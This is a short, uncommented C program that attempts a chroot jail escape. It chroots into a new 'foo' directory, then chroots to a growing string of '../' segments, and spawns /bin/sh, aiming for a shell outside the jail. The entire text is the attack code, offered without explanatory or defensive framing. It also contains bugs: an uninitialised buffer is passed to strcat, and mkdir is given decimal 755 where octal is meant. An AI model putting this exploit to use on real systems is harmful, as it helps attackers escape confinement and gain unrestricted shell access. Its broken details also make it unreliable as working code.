#define BSIZE 256

int main (int argc, char**argv)
{
  int i;
  char buffer[BSIZE];
  char *buffer2 = "../";
  
  chroot(".");
  chdir("/");
  
  mkdir("foo", 755);
  
  for (i=0; i<(BSIZE-1)/3; i++)
  {
    chroot("foo");
    
    strcat(buffer,buffer2);
    chroot(buffer);     
 
    if(execl("/bin/sh","/bin/sh",0) < 0)
      continue;
    else
      break;
  }
}
